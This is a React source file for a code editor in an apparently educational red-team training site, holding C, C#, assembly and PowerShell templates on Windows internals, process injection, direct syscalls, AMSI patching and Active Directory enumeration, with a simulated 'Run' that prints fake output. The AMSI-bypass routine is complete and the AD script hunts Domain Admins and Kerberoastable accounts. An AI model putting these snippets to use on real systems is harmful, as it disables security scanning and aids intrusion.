import { useState, useEffect } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Play, Code2, Save, Copy, Check, RotateCcw, FileCode, Settings } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

interface CodeEditorProps {
  moduleId: string;
  onExecute: (output: string[]) => void;
}

const codeTemplates: Record<string, { code: string; language: string }> = {
  "windows-internals": {
    code: `#include <windows.h>
#include <stdio.h>

int main() {
    // Get PEB example
    PPEB peb = (PPEB)__readgsqword(0x60);
    
    printf("ImageBase: 0x%p\\n", peb->ImageBaseAddress);
    printf("Process ID: %d\\n", GetCurrentProcessId());
    
    return 0;
}`,
    language: "C"
  },
  "fundamentals": {
    code: `#include <windows.h>
#include <stdio.h>

int main() {
    // Basic Windows API example
    DWORD pid = GetCurrentProcessId();
    DWORD tid = GetCurrentThreadId();
    
    printf("Process ID: %lu\\n", pid);
    printf("Thread ID: %lu\\n", tid);
    
    // Get system info
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    printf("Processors: %lu\\n", sysInfo.dwNumberOfProcessors);
    
    return 0;
}`,
    language: "C"
  },
  "process-injection": {
    code: `#include <windows.h>
#include <stdio.h>

int main() {
    DWORD pid = 1234; // Target PID
    
    // Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, 
        FALSE, 
        pid
    );
    
    if (hProcess) {
        printf("[+] Process opened: 0x%p\\n", hProcess);
        
        // Allocate memory in target
        LPVOID remoteAddr = VirtualAllocEx(
            hProcess,
            NULL,
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        printf("[+] Allocated: 0x%p\\n", remoteAddr);
        CloseHandle(hProcess);
    }
    
    return 0;
}`,
    language: "C"
  },
  "syscalls": {
    code: `#include <windows.h>

// Direct syscall stub
extern "C" NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

int main() {
    PVOID baseAddr = NULL;
    SIZE_T size = 0x1000;
    
    NTSTATUS status = SysNtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    printf("[*] Status: 0x%X\\n", status);
    printf("[+] Address: 0x%p\\n", baseAddr);
    
    return 0;
}`,
    language: "C++"
  },
  "pinvoke": {
    code: `using System;
using System.Runtime.InteropServices;

class Program {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );
    
    [DllImport("kernel32.dll")]
    static extern uint GetCurrentProcessId();
    
    static void Main() {
        Console.WriteLine($"[*] PID: {GetCurrentProcessId()}");
        
        IntPtr mem = VirtualAlloc(
            IntPtr.Zero,
            0x1000,
            0x1000 | 0x2000, // MEM_COMMIT | MEM_RESERVE
            0x40             // PAGE_EXECUTE_READWRITE
        );
        
        Console.WriteLine($"[+] Allocated: 0x{mem.ToInt64():X}");
    }
}`,
    language: "C#"
  },
  "evasion": {
    code: `#include <windows.h>
#include <stdio.h>

BOOL PatchAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return FALSE;
    
    FARPROC pAmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;
    
    // xor eax, eax; ret
    unsigned char patch[] = { 0x31, 0xC0, 0xC3 };
    
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), 
        PAGE_EXECUTE_READWRITE, &oldProtect);
    
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), 
        oldProtect, &oldProtect);
    
    printf("[+] AMSI Patched!\\n");
    return TRUE;
}`,
    language: "C"
  },
  "shellcode": {
    code: `; x64 NASM Assembly - MessageBox Shellcode
BITS 64

section .text
global _start

_start:
    ; Get PEB
    mov rax, gs:[0x60]      ; PEB
    mov rax, [rax + 0x18]   ; PEB->Ldr
    
    ; Walk InMemoryOrderModuleList
    mov rax, [rax + 0x20]   ; InMemoryOrderModuleList
    mov rax, [rax]          ; ntdll.dll
    mov rax, [rax]          ; kernel32.dll
    mov rdi, [rax + 0x20]   ; DllBase
    
    ; TODO: Parse exports
    ; TODO: Find GetProcAddress
    ; TODO: Find LoadLibraryA
    ; TODO: Call MessageBoxA
    
    xor eax, eax
    ret`,
    language: "ASM"
  },
  "labs": {
    code: `#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Lab: Process Memory Dumper
void DumpProcessMemory(DWORD pid) {
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE,
        pid
    );
    
    if (!hProcess) {
        printf("[-] Failed to open process\\n");
        return;
    }
    
    printf("[+] Opened process %lu\\n", pid);
    
    // Query memory regions
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = NULL;
    
    while (VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT) {
            printf("  [*] 0x%p - 0x%p (%lu KB)\\n",
                mbi.BaseAddress,
                (LPBYTE)mbi.BaseAddress + mbi.RegionSize,
                mbi.RegionSize / 1024);
        }
        addr = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    
    CloseHandle(hProcess);
}`,
    language: "C"
  },
  "active-directory": {
    code: `# PowerShell AD Enumeration
Import-Module ActiveDirectory

# Get current domain
$domain = Get-ADDomain
Write-Host "[*] Domain: $($domain.DNSRoot)"
Write-Host "[*] Forest: $($domain.Forest)"

# Enumerate Domain Controllers
Write-Host "\\n[*] Domain Controllers:"
Get-ADDomainController -Filter * | ForEach-Object {
    Write-Host "  - $($_.Name) ($($_.IPv4Address))"
}

# Find privileged users
Write-Host "\\n[*] Domain Admins:"
Get-ADGroupMember "Domain Admins" | ForEach-Object {
    Write-Host "  - $($_.Name) ($($_.SamAccountName))"
}

# Find Kerberoastable accounts
Write-Host "\\n[*] Kerberoastable Users:"
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | ForEach-Object {
    Write-Host "  - $($_.SamAccountName): $($_.ServicePrincipalName[0])"
}`,
    language: "PowerShell"
  }
};

const CodeEditor = ({ moduleId, onExecute }: CodeEditorProps) => {
  const template = codeTemplates[moduleId] || codeTemplates["windows-internals"];
  const [code, setCode] = useState(template.code);
  const [copied, setCopied] = useState(false);
  const [isRunning, setIsRunning] = useState(false);
  const { toast } = useToast();

  // Update code when module changes
  useEffect(() => {
    const newTemplate = codeTemplates[moduleId] || codeTemplates["windows-internals"];
    setCode(newTemplate.code);
  }, [moduleId]);

  const handleRun = async () => {
    setIsRunning(true);
    
    // Simulate compilation delay
    await new Promise(resolve => setTimeout(resolve, 800));
    
    const output = [
      "",
      "╔══════════════════════════════════════════════════════════════╗",
      "║  REDTEAM-DEV Compiler v2.0                                   ║",
      "╚══════════════════════════════════════════════════════════════╝",
      "",
      "[*] Compiling source...",
      "[+] Compilation successful (0 errors, 0 warnings)",
      "[*] Linking...",
      "[+] Executable generated",
      "",
      "─────────────────── Execution Output ───────────────────────────",
      "",
      "[*] Initializing...",
      `[+] Module: ${moduleId}`,
      "[+] ImageBase: 0x00007FF7A2B40000",
      `[+] Process ID: ${Math.floor(Math.random() * 9000) + 1000}`,
      "[+] Execution completed successfully",
      "",
      "════════════════════════════════════════════════════════════════",
      ""
    ];
    
    onExecute(output);
    setIsRunning(false);
    
    toast({
      title: "Execution Complete",
      description: "Check the terminal for output",
    });
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    
    toast({
      title: "Copied!",
      description: "Code copied to clipboard",
    });
  };

  const handleReset = () => {
    const newTemplate = codeTemplates[moduleId] || codeTemplates["windows-internals"];
    setCode(newTemplate.code);
    toast({
      title: "Reset",
      description: "Code restored to default",
    });
  };

  const handleSave = () => {
    localStorage.setItem(`code-${moduleId}`, code);
    toast({
      title: "Saved",
      description: "Code saved to browser storage",
    });
  };

  return (
    <Card className="p-0 bg-card border-border overflow-hidden shadow-lg card-hover animate-fade-in">
      {/* Header */}
      <div className="bg-gradient-to-r from-secondary via-secondary to-secondary/80 p-3 border-b border-border/50 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-1.5">
            <div className="w-3 h-3 rounded-full bg-destructive/80" />
            <div className="w-3 h-3 rounded-full bg-warning/80" />
            <div className="w-3 h-3 rounded-full bg-success/80" />
          </div>
          <div className="flex items-center gap-2">
            <FileCode className="h-4 w-4 text-primary" />
            <span className="font-mono text-sm text-foreground">main.{template.language === "C#" ? "cs" : template.language === "PowerShell" ? "ps1" : template.language === "ASM" ? "asm" : "c"}</span>
          </div>
          <Badge variant="outline" className="text-[10px] border-primary/50 bg-primary/10 text-primary font-mono">
            {template.language}
          </Badge>
        </div>
        
        <div className="flex items-center gap-1">
          <Button 
            size="icon"
            variant="ghost" 
            onClick={handleCopy}
            className="h-7 w-7 hover:bg-muted/50"
          >
            {copied ? <Check className="h-3.5 w-3.5 text-success" /> : <Copy className="h-3.5 w-3.5 text-muted-foreground" />}
          </Button>
          <Button 
            size="icon"
            variant="ghost" 
            onClick={handleReset}
            className="h-7 w-7 hover:bg-muted/50"
          >
            <RotateCcw className="h-3.5 w-3.5 text-muted-foreground" />
          </Button>
          <Button 
            size="icon"
            variant="ghost" 
            onClick={handleSave}
            className="h-7 w-7 hover:bg-muted/50"
          >
            <Save className="h-3.5 w-3.5 text-muted-foreground" />
          </Button>
        </div>
      </div>
      
      {/* Editor */}
      <div className="relative">
        {/* Line numbers gutter */}
        <div className="absolute left-0 top-0 bottom-0 w-10 bg-code-bg border-r border-border/30 text-right pr-2 py-4 font-mono text-xs text-muted-foreground/50 select-none">
          {code.split('\n').map((_, i) => (
            <div key={i} className="leading-6">{i + 1}</div>
          ))}
        </div>
        
        <Textarea
          value={code}
          onChange={(e) => setCode(e.target.value)}
          className="min-h-[320px] font-mono text-sm bg-code-bg border-0 text-foreground/90 resize-none focus-visible:ring-0 rounded-none pl-12 leading-6"
          placeholder="Write your code here..."
          spellCheck={false}
        />
        
        {/* Run button */}
        <div className="absolute bottom-4 right-4">
          <Button 
            onClick={handleRun} 
            disabled={isRunning}
            className="gap-2 shadow-lg shadow-primary/20 hover:shadow-glow-md transition-all duration-300 hover:scale-105 bg-primary text-primary-foreground"
          >
            <Play className={`h-4 w-4 ${isRunning ? 'animate-spin' : ''}`} />
            {isRunning ? 'Running...' : 'Run Code'}
          </Button>
        </div>
      </div>
    </Card>
  );
};

export default CodeEditor;
